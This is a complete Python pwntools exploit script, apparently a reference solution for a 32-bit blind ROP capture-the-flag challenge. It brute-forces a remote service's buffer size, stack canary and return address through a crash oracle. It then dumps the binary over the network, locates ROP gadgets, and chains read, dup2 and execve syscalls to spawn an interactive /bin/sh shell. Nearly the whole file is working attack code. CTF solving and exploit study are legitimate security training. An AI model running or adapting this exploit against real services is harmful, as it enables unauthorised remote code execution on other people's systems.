#!/usr/bin/env python3
from pwn import *
import os
import pickle
import sys

HOST = ''
PORT = 40018

NUM_ATTEMPTS = 1

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

# attack plan: the attack here is easier than the 64bit version of a brop challenge
#              because arguments are passed on the stack, so you just need to use an
#              oracle and brute force as much stack data as possible (a return addr,
#              saved base pointer, perhaps some alignment bytes and sometimes a ref
#              to a FILE *) and then after that you can use pure deduction to figure
#              out what the output function is and therefor how to use it in order
#              to dump enough of the raw binary to know what functions are where.


def cache_save(label, record):

    data = cache_load()
    if data is None:
        data = {}

    data[label] = record

    with open('cache.pickle', 'wb') as f:
        pickle.dump(data, f, protocol=pickle.HIGHEST_PROTOCOL)


def cache_load(label=None):

    if os.path.exists('cache.pickle'):
        with open('cache.pickle', 'rb') as f:
            data = pickle.load(f)

            if label:
                if label in data:
                    return data[label]
            else:
                return data

    return None


def cache_dump(io, prefix, size, label='data'):

    data = cache_load(label)
    if data is None:

        data = b''
        while len(data) < size:
            for c in range(0x100):

                if c == 0x0a:
                    continue

                try:

                    byte = bytes([c])

                    log.info('trying: %#04x at position %d (%s: %s)', c, len(data), label, data.hex())
                    io = remote(HOST, PORT, level='warn')

                    io.recvuntil(': ')
                    io.sendline(prefix+data+byte)
                    line = io.recvline()
                    io.close()

                    if b'darkest' in line:
                        data += byte
                        log.success('%s: %s', label, data.hex())
                        break

                except EOFError:
                    io.close()

        cache_save(label, data)

    return data

def exploit_attempt():
    try:
        io = None
        if len(HOST) == 0:
            raise ValueError("This exploit is not configured to run locally. Please provide HOST and PORT")

        # step 1: find the size of the buffer
        size = cache_load('size')
        if size is None:
            for i in range(0x08, 0x200):
                try:
                    io = remote(HOST, PORT, level='warn')

                    if i == 0:
                        print(io.recvuntil(b'\nbuf')[:-5])

                    log.info('size: %d?' % i)
                    io.recvuntil(b': ')
                    io.sendline('x'*i)
                    io.recvline()
                    io.close()

                except EOFError:
                    io.close()
                    size = i-1
                    cache_save('size', size)
                    break

        # setup the prefix we will append data to as we go
        prefix  = b'A'*size

        # dump the canary
        canary  = cache_dump(io, prefix, 4, 'canary')
        prefix += canary
        canary  = u32(canary)

        log.success('canary: %#010x', canary)

        # dump the .data section pointer
        ddata   = cache_dump(io, prefix, 4, '.data')
        prefix += ddata
        ddata   = u32(ddata)

        log.success('.data:  %#010x', ddata)

        # dump alignment bytes
        prefix += cache_dump(io, prefix, 4, 'align')

        # dump the saved base pointer
        ebp     = cache_dump(io, prefix, 4, 'ebp')
        prefix += ebp
        ebp     = u32(ebp)

        log.success('stack:  %#010x', ebp)

        # dump the saved instruction pointer
        ret     = cache_dump(io, prefix, 4, 'ret')
        #prefix += ret
        ret     = u32(ret)

        log.success('return: %#010x', ret)

        # hunt down a way to leak the binary, we pass arguments on the stack so it
        # is fairly easy to just look for a write or send call (similar args) with
        # a known address.

        addr = cache_load('addr')
        if addr is None:
            for i in range(-256, 256):
                try:
                    io = remote(HOST, PORT, level='warn')

                    addr = ret+i
                    log.info('addr: %#010x', addr)
                    io.recvuntil(': ')
                    io.sendline(prefix+p32(addr)+p32(0x04)+p32(0x08048000)+p32(0x100))
                    line = io.recvline()

                    io.close()
                    
                    if b'ELF' in line:
                        cache_save('addr', addr)
                        break

                except EOFError:
                    io.close()

        log.success('write: %#010x', addr)

        data = b''
        for i in range(0, 0x100000, 0x1000):
            try:
                io = remote(HOST, PORT, level='warn')

                log.info('dumping: %#010x', 0x08048000+i)
                io.recvuntil(': ')
                io.sendline(prefix+p32(addr)+p32(0x04)+p32(0x08048000+i)+p32(0x1000))
                chunk = io.recvn(0x1000)
                #print(len(chunk))

                data += chunk

                if len(chunk) < 0x1000:
                    break

                io.close()

            except EOFError:
                data += b'\x00'*0x1000
                io.close()

        with open('dump.bin', 'wb') as f:
            f.write(data)
            log.success('wrote %d bytes to %s', len(data), 'dump.bin')

        # now lets hunt for gadgets
        gadgets = [
            { 'opcode': bytes.fromhex('58c3'),   'mnemonic': 'pop eax; ret',            'addr': 0 },
            { 'opcode': bytes.fromhex('595bc3'), 'mnemonic': 'pop ecx ; pop ebx ; ret', 'addr': 0 },
            { 'opcode': bytes.fromhex('5ac3'),   'mnemonic': 'pop edx; ret',            'addr': 0 },
            { 'opcode': bytes.fromhex('cd80c3'), 'mnemonic': 'int 0x80; ret',           'addr': 0 },
        ]

        found = 0
        for gadget in gadgets:
            index = data.find(gadget['opcode'])
            if index != -1:
                gadget['addr'] = 0x08048000+index
                found += 1

        if len(gadgets) != found:
            log.error('could not find all gadgets')


        for gadget in gadgets:
            log.info('gadget: %s => %#010x', gadget['mnemonic'], gadget['addr'])

        # build the rop chain
        ropchain = b''

        # sys_read(0, .data, len("/bin/sh\0"))
        ropchain += p32(gadgets[0]['addr'])
        ropchain += p32(0x03) # eax
        ropchain += p32(gadgets[1]['addr'])
        ropchain += p32(ebp-100) # ecx
        ropchain += p32(4) # ebx
        ropchain += p32(gadgets[2]['addr'])
        ropchain += p32(len('/bin/sh\0')) # edx
        ropchain += p32(gadgets[3]['addr'])

        # sys_dup2(4, 0)
        ropchain += p32(gadgets[0]['addr'])
        ropchain += p32(0x3F) # eax
        ropchain += p32(gadgets[1]['addr'])
        ropchain += p32(0) # ecx
        ropchain += p32(4) # ebx
        ropchain += p32(gadgets[3]['addr'])

        # sys_dup2(4, 1)
        ropchain += p32(gadgets[0]['addr'])
        ropchain += p32(0x3F) # eax
        ropchain += p32(gadgets[1]['addr'])
        ropchain += p32(1) # ecx
        ropchain += p32(4) # ebx
        ropchain += p32(gadgets[3]['addr'])

        # sys_execve(.data, NULL, NULL)
        ropchain += p32(gadgets[0]['addr'])
        ropchain += p32(0x0B) # eax
        ropchain += p32(gadgets[1]['addr'])
        ropchain += p32(0) # ecx
        ropchain += p32(ebp-100) # ebx
        ropchain += p32(gadgets[2]['addr'])
        ropchain += p32(0) # edx
        ropchain += p32(gadgets[3]['addr'])


        io = remote(HOST, PORT, level='warn')
        io.recvuntil(b'buffer:')
        io.sendline(prefix + ropchain)
        io.send(b'/bin/sh\0')

        # Shell
        io.sendline(b'id')
        id_result = io.recvline()
        if b'uid=' in id_result:
            log.success('shell: %s', id_result.decode('ascii').strip())
            if not os.environ.get('HEALTH_CHECK', False):
                io.interactive()
            return True
        else:
            log.failure('Error: %s', id_result)
    except EOFError as e:
        log.failure('Fail: EOF')
    except Exception as e:
        log.failure('Error: %s: %s', type(e), str(e))
    finally:
        if io:
            io.close()
    return False

if __name__ == '__main__':
    os.remove('dump.bin')
    os.remove('cache.pickle')
    for _ in range(NUM_ATTEMPTS):
        if exploit_attempt():
            sys.exit(0)
        sleep(0.1)
    sys.exit(1)
